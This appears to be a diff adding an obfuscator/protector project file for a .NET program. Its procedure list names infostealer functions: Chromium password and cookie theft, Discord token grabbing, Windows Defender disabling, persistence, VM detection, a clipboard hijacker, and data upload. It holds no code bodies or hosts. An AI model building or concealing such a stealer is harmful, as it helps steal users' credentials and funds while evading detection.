@@ -1,0 +1,149 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<Document Version="2">
+    <Protection InputFileName="#exe" Options="852680" LicenseDataFileName="#icksde">
+        <Messages />
+        <Folders />
+        <Procedures>
+            <Procedure MapAddress="Infos::GetCountryByIP()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Infos::IP()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Infos::GetHDDSerial()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Infos::GetShortID()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Infos::MyMessageBox(object, object)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Infos::.ctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Infos::.cctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Crypto::decrypt(string)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Crypto::encrypt(string)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Crypto::EncryptString(string, unsigned int8[], unsigned int8[])" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Crypto::DecryptString(string, unsigned int8[], unsigned int8[])" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Crypto::SHA(string)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Crypto::.ctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Crypto::.cctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="UploadData::HttpUploadFile(string, class System.Collections.Generic.List`1&lt;string&gt;, class System.Collections.Generic.List`1&lt;string&gt;, string[], class System.Collections.Specialized.NameValueCollection, class System.Collections.Specialized.NameValueCollection)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="UploadData::.ctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="IpInfo::get_Country()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="IpInfo::set_Country(string)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="IpInfo::get_IP()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="IpInfo::set_IP(string)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="IpInfo::.ctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="AesGcm::Decrypt(unsigned int8[], unsigned int8[], unsigned int8[], unsigned int8[], unsigned int8[])" Options="0" CompilationType="1" />
+            <Procedure MapAddress="AesGcm::MaxAuthTagSize(native int)" Options="0" CompilationType="1" />
+            <Procedure MapAddress="AesGcm::OpenAlgorithmProvider(string, string, string)" Options="0" CompilationType="1" />
+            <Procedure MapAddress="AesGcm::ImportKey(native int, unsigned int8[], native int&amp;)" Options="0" CompilationType="1" />
+            <Procedure MapAddress="AesGcm::GetProperty(native int, string)" Options="0" CompilationType="1" />
+            <Procedure MapAddress="AesGcm::Concat(unsigned int8[][])" Options="0" CompilationType="1" />
+            <Procedure MapAddress="AesGcm::.ctor()" Options="0" CompilationType="1" />
+            <Procedure MapAddress="BCrypt::.cctor()" Options="0" CompilationType="1" />
+            <Procedure MapAddress="Account::get_UserName()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Account::set_UserName(string)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Account::get_Password()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Account::set_Password(string)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Account::get_URL()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Account::set_URL(string)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Account::get_Application()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Account::set_Application(string)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Account::.ctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Chromium::Grab()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Chromium::Accounts(string, string, string)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Chromium::GetAllProfiles(string)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Chromium::DecryptWithKey(unsigned int8[], unsigned int8[])" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Chromium::GetMasterKey(string)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Chromium::Decrypt(string)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Chromium::.ctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Chromium::.cctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="SQLiteHandler::.ctor(string)" Options="0" CompilationType="1" />
+            <Procedure MapAddress="SQLiteHandler::ConvertToInteger(int32, int32)" Options="0" CompilationType="1" />
+            <Procedure MapAddress="SQLiteHandler::CVL(int32, int32)" Options="0" CompilationType="1" />
+            <Procedure MapAddress="SQLiteHandler::GetRowCount()" Options="0" CompilationType="1" />
+            <Procedure MapAddress="SQLiteHandler::GetTableNames()" Options="0" CompilationType="1" />
+            <Procedure MapAddress="SQLiteHandler::GetValue(int32, int32)" Options="0" CompilationType="1" />
+            <Procedure MapAddress="SQLiteHandler::GetValue(int32, string)" Options="0" CompilationType="1" />
+            <Procedure MapAddress="SQLiteHandler::GVL(int32)" Options="0" CompilationType="1" />
+            <Procedure MapAddress="SQLiteHandler::IsOdd(int64)" Options="0" CompilationType="1" />
+            <Procedure MapAddress="SQLiteHandler::ReadMasterTable(unsigned int64)" Options="0" CompilationType="1" />
+            <Procedure MapAddress="SQLiteHandler::ReadTable(string)" Options="0" CompilationType="1" />
+            <Procedure MapAddress="SQLiteHandler::ReadTableFromOffset(unsigned int64)" Options="0" CompilationType="1" />
+            <Procedure MapAddress="Defender::Disable()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Defender::RegistryEdit(string, string, string)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Defender::CheckDefender()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Defender::RunPS(string)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Defender::Registrys()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Defender::.ctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="GetDiscordToken::ReadAllLines(string)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="GetDiscordToken::TokenRegexCheck(string)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="GetDiscordToken::PerformTokenCheck(string)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="GetDiscordToken::RetrieveDiscordTokens()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="GetDiscordToken::.ctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="GetDiscordToken::.cctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="VirtualMachine::CheckVM()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="VirtualMachine::DetectVM()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="VirtualMachine::.ctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Clipboard::GetText()" Options="0" CompilationType="1" />
+            <Procedure MapAddress="Clipboard::SetText(string)" Options="0" CompilationType="1" />
+            <Procedure MapAddress="test.Program::get_IsElevated()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program::Main(string[])" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program::Helper()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program::addStartup()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program::criticalProcess()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program::SystemEvents_SessionEnded(object, class Microsoft.Win32.SessionEndedEventArgs)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program::passwordRecovery()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program::disableWindowsDefender()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program::disableRecoveryEnv()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program::DiscordToken()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program::Clipper()" Options="0" CompilationType="1" />
+            <Procedure MapAddress="test.Program::Run()" Options="0" CompilationType="1" />
+            <Procedure MapAddress="test.Program::GetCookieAsync()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program::GetAsync(string)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program::GetCommandLine(class System.Diagnostics.Process)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program::uploadData()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program::.ctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program::.cctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="BCrypt/BCRYPT_PSS_PADDING_INFO::.ctor(string, int32)" Options="0" CompilationType="1" />
+            <Procedure MapAddress="BCrypt/BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO::.ctor(unsigned int8[], unsigned int8[], unsigned int8[])" Options="0" CompilationType="1" />
+            <Procedure MapAddress="BCrypt/BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO::Dispose()" Options="0" CompilationType="1" />
+            <Procedure MapAddress="BCrypt/BCRYPT_OAEP_PADDING_INFO::.ctor(string)" Options="0" CompilationType="1" />
+            <Procedure MapAddress="Defender/&lt;&gt;c::.cctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Defender/&lt;&gt;c::.ctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Defender/&lt;&gt;c::&lt;Registrys&gt;b__4_0()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="GetDiscordToken/&lt;&gt;c::.cctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="GetDiscordToken/&lt;&gt;c::.ctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="GetDiscordToken/&lt;&gt;c::&lt;RetrieveDiscordTokens&gt;b__11_0(string)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Clipper/PatternRegex::.cctor()" Options="0" CompilationType="1" />
+            <Procedure MapAddress="Clipper/NativeMethods::.cctor()" Options="0" CompilationType="1" />
+            <Procedure MapAddress="Clipboard/&lt;&gt;c__DisplayClass0_0::&lt;GetText&gt;b__0()" Options="0" CompilationType="1" />
+            <Procedure MapAddress="Clipboard/&lt;&gt;c__DisplayClass1_0::&lt;SetText&gt;b__0()" Options="0" CompilationType="1" />
+            <Procedure MapAddress="ClipboardNotification/NotificationForm::.ctor()" Options="0" CompilationType="1" />
+            <Procedure MapAddress="ClipboardNotification/NotificationForm::RegexResult(class System.Text.RegularExpressions.Regex)" Options="0" CompilationType="1" />
+            <Procedure MapAddress="ClipboardNotification/NotificationForm::WndProc(valuetype System.Windows.Forms.Message&amp;)" Options="0" CompilationType="1" />
+            <Procedure MapAddress="ClipboardNotification/NotificationForm::.cctor()" Options="0" CompilationType="1" />
+            <Procedure MapAddress="test.Program/&lt;&gt;c::.cctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program/&lt;&gt;c::.ctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program/&lt;&gt;c::&lt;Main&gt;b__38_0()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program/&lt;&gt;c::&lt;Main&gt;b__38_1()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program/&lt;&gt;c::&lt;Main&gt;b__38_2()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program/&lt;&gt;c::&lt;Main&gt;b__38_3()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program/&lt;&gt;c::&lt;Helper&gt;b__39_0()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program/&lt;&gt;c::&lt;disableRecoveryEnv&gt;b__45_0()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program/&lt;&gt;c::&lt;Clipper&gt;b__46_0()" Options="0" CompilationType="1" />
+            <Procedure MapAddress="test.Program/&lt;disableRecoveryEnv&gt;d__45::.ctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program/&lt;disableRecoveryEnv&gt;d__45::MoveNext()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program/&lt;disableRecoveryEnv&gt;d__45::SetStateMachine(class System.Runtime.CompilerServices.IAsyncStateMachine)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program/&lt;GetCookieAsync&gt;d__47::.ctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program/&lt;GetCookieAsync&gt;d__47::MoveNext()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program/&lt;GetCookieAsync&gt;d__47::SetStateMachine(class System.Runtime.CompilerServices.IAsyncStateMachine)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program/&lt;GetAsync&gt;d__48::.ctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program/&lt;GetAsync&gt;d__48::MoveNext()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program/&lt;GetAsync&gt;d__48::SetStateMachine(class System.Runtime.CompilerServices.IAsyncStateMachine)" Options="0" CompilationType="2" />
+            <Procedure MapAddress="Defender/&lt;&gt;c/&lt;&lt;Registrys&gt;b__4_0&gt;d::.ctor()" Options="0" CompilationType="1" />
+            <Procedure MapAddress="Defender/&lt;&gt;c/&lt;&lt;Registrys&gt;b__4_0&gt;d::MoveNext()" Options="0" CompilationType="1" />
+            <Procedure MapAddress="Defender/&lt;&gt;c/&lt;&lt;Registrys&gt;b__4_0&gt;d::SetStateMachine(class System.Runtime.CompilerServices.IAsyncStateMachine)" Options="0" CompilationType="1" />
+            <Procedure MapAddress="test.Program/&lt;&gt;c/&lt;&lt;disableRecoveryEnv&gt;b__45_0&gt;d::.ctor()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program/&lt;&gt;c/&lt;&lt;disableRecoveryEnv&gt;b__45_0&gt;d::MoveNext()" Options="0" CompilationType="2" />
+            <Procedure MapAddress="test.Program/&lt;&gt;c/&lt;&lt;disableRecoveryEnv&gt;b__45_0&gt;d::SetStateMachine(class System.Runtime.CompilerServices.IAsyncStateMachine)" Options="0" CompilationType="2" />
+        </Procedures>
+        <Objects />
+    </Protection>
+    <DLLBox>
+        <Folders />
+    </DLLBox>
+    <Script />
+</Document>
